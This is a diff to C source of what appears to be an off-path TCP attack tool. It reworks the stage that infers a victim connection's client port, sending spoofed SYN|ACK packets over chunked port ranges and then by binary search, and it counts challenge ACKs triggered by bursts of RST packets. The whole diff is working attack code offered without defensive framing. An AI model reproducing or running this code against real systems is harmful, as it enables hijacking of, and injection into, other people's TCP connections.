@@ -51,6 +51,9 @@
 // #define DEVICE "ppp0"
 #define SNAPLEN 1500
 
+#define PACKETS_PER_ROUND 4000
+#define PACKET_DELAY 100
+
 
 /* TCP connection tracking */
 typedef enum {
@@ -90,6 +93,13 @@ typedef struct thctx_struct {
 	struct sockaddr_in *cli;
 	uint16_t winsz; // initial TCP window size
 } thctx_t;
+
+/* for probing groups of values, limited by PACKETS_PER_SECOND */
+typedef struct chunk_struct {
+	u_long start;
+	u_long end;
+	int chacks;
+} chunk_t;
 
 
 /* global count for challenge ACKs received in one period */
@@ -520,6 +530,39 @@ int sync_time_with_remote(void)
 }
 
 
+/*
+ * build a test schedule based on the start end end range
+ */
+chunk_t *build_schedule(u_long start, u_long end, int *pnchunks)
+{
+	int i, num, nchunks, chunk_sz = PACKETS_PER_ROUND;
+	chunk_t *schedule = NULL;
+
+	num = end - start;
+	if (num <= chunk_sz) {
+		fprintf(stderr, "[!] build_schedule: invalid range (too small)!\n");
+		return NULL;
+	}
+	nchunks = (num / chunk_sz) + 1;
+
+	schedule = (chunk_t *)malloc(sizeof(chunk_t) * nchunks);
+	if (!schedule) {
+		perror("[!] malloc");
+		return NULL;
+	}
+
+	for (i = 0; i < nchunks; i++) {
+		schedule[i].start = start + (i * chunk_sz);
+		schedule[i].end = start + ((i + 1) * chunk_sz);
+		if (schedule[i].end > end)
+			schedule[i].end = end;
+	}
+
+	*pnchunks = nchunks;
+	return schedule;
+}
+
+
 /* stage 2 - four tuple inference
  *
  * send a spoofed SYN|ACK to try to elicit a challenge ACK for the purported
@@ -532,7 +575,12 @@ int infer_four_tuple(void)
 	struct timeval now, diff;
 #endif
 	volatile conn_t *spoof = &(g_ctx.conn_spoof);
-	uint16_t guess_start = 0, guess_end = 0, guess_mid = 0;
+	int test_mode = -1;
+	/* chunk-based search vars */
+	chunk_t *sched = NULL;
+	int nchunks, ci = 0;
+	/* binary search vars */
+	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
 
 	while (1) {
 		gettimeofday(&round_start, NULL);
@@ -543,50 +591,83 @@ int infer_four_tuple(void)
 			return 0;
 		}
 
+		/* we have three possibilities:
+		 * 1. we have a port hint -- we just want to test that one (but fall
+		 *    back if it fails) -- test_mode:0
+		 * 2. we have > PACKETS_PER_ROUND ports to test -- we want to use a
+		 *    schedule -- test_mode:1
+		 * 3. we have < PACKETS_PER_ROUND ports to test -- we want to use a
+		 *    modified binary search. -- test_mode:2
+		 */
+
 		/* if we need to initialize the ranges, do so now */
-		if (guess_mid == 0) {
+		if (test_mode == -1) {
 			/* if we already have a guess, try it first */
 			if (spoof->src->sin_port) {
 				/* if it hits, we set these equal to signify a win.
 				 *
 				 * we leave guess_mid set to 0 in case we missed..
 				 */
-				guess_start = guess_end = ntohs(spoof->src->sin_port);
+				bs_mid = bs_start = bs_end = ntohs(spoof->src->sin_port);
+				test_mode = 0;
 			}
 			/* no initial guess available... */
 			else {
-				/* initialize algorithm for port number checking
-				 * ... "the default range on Linux is only from 32768 to 61000"
+				/* initialize algorithm for port number checking * ... "the default range on Linux is only from 32768 to 61000"
 				 */
 				// XXX: TODO: scale number of guesses per round based on feedback
-				guess_start = 32768;
-				guess_end = 65535;
+				sched = build_schedule(32768, 61000, &nchunks);
+				if (!sched)
+					return 0;
+
+				/* process chunks from 0 to nchunks */
+				test_mode = 1;
 			}
+			/* test_mode 2 is launched via schedule exhaustion.. */
 		}
 
-		/* send the packet(s)! */
-		if (spoof->src->sin_port) {
+		/* send spoofed packets in an attempt to elicit challenge ACKs to the
+		 * victim. depending on how many ports we need to probe, we may use a
+		 * different approach */
+		if (test_mode == 0) {
+			/* just test this single one */
 			if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 				return 0;
-			/* only send this once. */
-			spoof->src->sin_port = 0;
-		} else {
-			uint16_t guess;
+		} else if (test_mode == 1) {
+			/* process the current chunk */
+			u_long guess;
 
-			guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
-			for (guess = guess_mid; guess < guess_end; guess++) {
-				/* meh. we have to recalculate the TCP checksum to alter the source port */
+			bs_mid = bs_start = sched[ci].start;
+			bs_end = sched[ci].end;
+			for (guess = bs_start; guess < bs_end; guess++) {
 				spoof->src->sin_port = htons(guess);
 				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 					return 0;
+				usleep(PACKET_DELAY);
 			}
-			spoof->src->sin_port = 0;
-#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
-			gettimeofday(&now, NULL);
-			timersub(&now, &round_start, &diff);
-			printf("    sent %d spoofed SYN|ACK in %lu %lu\n", (int)(guess_end - guess_mid), diff.tv_sec, diff.tv_usec);
-#endif
+
+			/* we'll do maintenance after we check the results */
+		} else if (test_mode == 2) {
+			/* advance the binary search process! */
+			u_long guess;
+
+			bs_mid = (bs_start + bs_end) / 2;
+			for (guess = bs_mid; guess < bs_end; guess++) {
+				spoof->src->sin_port = htons(guess);
+				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
+					return 0;
+				usleep(PACKET_DELAY);
+			}
 		}
+
+		/* ensure we only send a single value once */
+		spoof->src->sin_port = 0;
+
+#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
+		gettimeofday(&now, NULL);
+		timersub(&now, &round_start, &diff);
+		printf("    sent %d spoofed SYN|ACK packets in %lu %lu\n", (int)(bs_end - bs_start), diff.tv_sec, diff.tv_usec);
+#endif
 
 		/* send 100 RSTs */
 		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
@@ -595,45 +676,80 @@ int infer_four_tuple(void)
 		/* get the number of challenge ACKs within this second */
 		wait_until("tuple-infer recv", &round_start, 1, 0);
 
-		printf("[*] tuple-infer: guessed port is in [%u - %u) (start: %u): %3d challenge ACKs - %s\n",
-				guess_mid, guess_end, guess_start,
+		printf("[*] tuple-infer: guessed port is in [%lu - %lu) (start: %lu): %3d challenge ACKs - %s\n",
+				bs_mid, bs_end, bs_start,
 				g_chack_cnt, g_chack_cnt == 99 ? "OK" : "NO");
 
-		/* adjust the search based on the results */
+		/* adjust the search based on the results and mode */
 		if (g_chack_cnt == 100) {
+			g_chack_cnt = 0;
+
 			/* if we exhausted the range and still didn't find it, start over */
-			if (guess_start >= guess_end) {
-				/* FAIL! */
-				printf("[!] Exhausted port search, starting over...\n");
-				guess_start = guess_end = guess_mid = 0;
+			if (test_mode == 0) {
+				/* failed! try the bigger search.. */
+				printf("[!] Your hint was incorrect! Falling back to search...\n");
+				test_mode = -1;
+			} else if (test_mode == 1) {
+				/* advance the chunk */
+				ci++;
+				if (ci == nchunks) {
+					printf("[!] Exhausted port chunk search...\n");
+					return 0;
+				}
+			} else if (test_mode == 2) {
+				if (bs_start >= bs_end) {
+					/* FAIL! */
+					printf("[!] Exhausted port binary search...\n");
+					/* go back to the beginning of the schedule?? */
+					return 0;
+				} else {
+					/* adjust range */
+					bs_end = bs_mid;
+				}
 			}
-			else
-				/* adjust range */
-				guess_end = guess_mid - 1;
 		} else if (g_chack_cnt == 99) {
-			/* if we only sent one guess this time, we won! */
-			if (guess_start == guess_end) {
-				/* special handling for hinted guess */
-				printf("[*] Confirmed client port: %u\n", guess_start);
-				spoof->src->sin_port = ntohs(guess_start);
-				g_chack_cnt = 0;
+			g_chack_cnt = 0;
+
+			if (test_mode == 0) {
+				/* correct! */
+				printf("[*] Confirmed client port (from hint): %lu\n", bs_start);
+				spoof->src->sin_port = ntohs(bs_start);
+				free(sched);
 				return 1;
-			} else if (guess_end - guess_mid == 1) {
-				/* we legitimately guessed it! */
-				printf("[*] Guessed client port: %u\n", guess_mid);
-				spoof->src->sin_port = ntohs(guess_mid);
-				g_chack_cnt = 0;
-				return 1;
+			} else if (test_mode == 1) {
+				/* proceed to a binary search of this block */
+				/* if there was only one port tested, it must be it! */
+				if (bs_end - bs_start <= 1) {
+					printf("[*] Confirmed client port (via chunk): %lu\n", bs_start);
+					spoof->src->sin_port = ntohs(bs_start);
+					free(sched);
+					return 1;
+				}
+				test_mode = 2;
+			} else if (test_mode == 2) {
+				/* if we only sent one guess this time, we won! */
+				if (bs_start == bs_end) {
+					// XXX: is this ever actually reached??
+					/* special handling for hinted guess?? */
+					printf("[*] Confirmed client port (eh?): %lu\n", bs_start);
+					spoof->src->sin_port = ntohs(bs_start);
+					free(sched);
+					return 1;
+				} else if (bs_end - bs_mid == 1) {
+					/* we legitimately guessed it via binary search! */
+					printf("[*] Guessed client port (via binary search): %lu\n", bs_mid);
+					spoof->src->sin_port = ntohs(bs_mid);
+					free(sched);
+					return 1;
+				}
+				else
+					/* adjust range */
+					bs_start = bs_mid;
 			}
-			else
-				/* adjust range */
-				guess_start = guess_mid;
 		} else {
 			// XXX: TODO: scale number of guesses per round based on feedback
 			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
 		}
-
-		g_chack_cnt = 0;
 	}
 
 	/* fail! */
